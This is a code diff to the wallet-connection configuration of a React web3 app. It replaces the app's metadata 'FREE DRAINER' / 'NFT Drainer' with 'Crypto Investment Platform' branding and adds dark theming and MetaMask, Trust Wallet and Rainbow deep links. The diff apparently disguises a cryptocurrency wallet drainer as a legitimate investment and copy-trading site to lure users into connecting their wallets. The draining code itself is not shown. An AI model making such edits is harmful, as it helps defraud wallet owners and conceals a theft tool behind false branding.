@@ -25,13 +25,13 @@ const chains = [mainnet, polygon, bsc, arbitrum]
 
 // Create wagmi config
 const metadata = {
-  name: '@0xTracey FREE DRAINER',
-  description: 'NFT Drainer',
+  name: 'Crypto Investment Platform',
+  description: 'Professional crypto investment and copy trading platform',
   url: window.location.origin,
-  icons: ['https://avatars.githubusercontent.com/u/37784886']
+  icons: [`${window.location.origin}/favicon.ico`]
 }
 
-// Enhanced configuration with better error handling
+// Enhanced configuration for better mobile support
 const wagmiConfig = defaultWagmiConfig({ 
   chains, 
   projectId, 
@@ -40,28 +40,81 @@ const wagmiConfig = defaultWagmiConfig({
   enableInjected: true,
   enableEIP6963: true,
   enableCoinbase: true,
-  // Add WalletConnect options for better reliability
+  // WalletConnect configuration for QR code support
   walletConnectOptions: {
-    relayUrl: 'wss://relay.walletconnect.org', // Fallback relay
     projectId: projectId,
+    metadata: metadata,
+    relayUrl: 'wss://relay.walletconnect.com',
+    // Add these for better QR code connectivity
+    qrModalOptions: {
+      themeMode: 'dark',
+      explorerRecommendedWalletIds: [
+        'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
+        '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
+      ],
+    },
   }
 })
 
-// Create Web3Modal with enhanced configuration
+// Create Web3Modal with mobile-optimized configuration
 createWeb3Modal({ 
   wagmiConfig, 
   projectId, 
   chains,
+  themeMode: 'dark',
   themeVariables: {
-    '--w3m-font-family': 'Anton, sans-serif',
-    '--w3m-color-mix': '#000000',
-    '--w3m-accent': '#000000'
+    '--w3m-font-family': 'system-ui, -apple-system, sans-serif',
+    '--w3m-accent': '#667eea',
+    '--w3m-border-radius-master': '12px'
   },
-  // Enable additional features for better connectivity
-  enableAnalytics: false, // Disable analytics for privacy
-  featuredWalletIds: [], // Allow all wallets
-  termsOfServiceUrl: '', // No terms of service
-  privacyPolicyUrl: '' // No privacy policy
+  enableAnalytics: false,
+  enableOnramp: false,
+  // QR Code Modal Configuration
+  defaultChain: mainnet,
+  includeWalletIds: [
+    'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
+    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
+    '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369', // Rainbow
+    'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa', // Coinbase Wallet
+  ],
+  // Mobile optimization
+  mobileWallets: [
+    {
+      id: 'metamask',
+      name: 'MetaMask',
+      links: {
+        native: 'metamask://',
+        universal: 'https://metamask.app.link'
+      }
+    },
+    {
+      id: 'trust',
+      name: 'Trust Wallet',
+      links: {
+        native: 'trust://',
+        universal: 'https://link.trustwallet.com'
+      }
+    },
+    {
+      id: 'rainbow',
+      name: 'Rainbow',
+      links: {
+        native: 'rainbow://',
+        universal: 'https://rainbow.me'
+      }
+    }
+  ],
+  // Desktop wallets
+  desktopWallets: [
+    {
+      id: 'metamask',
+      name: 'MetaMask',
+      links: {
+        native: '',
+        universal: 'https://metamask.io'
+      }
+    }
+  ]
 })
 
 function App() {
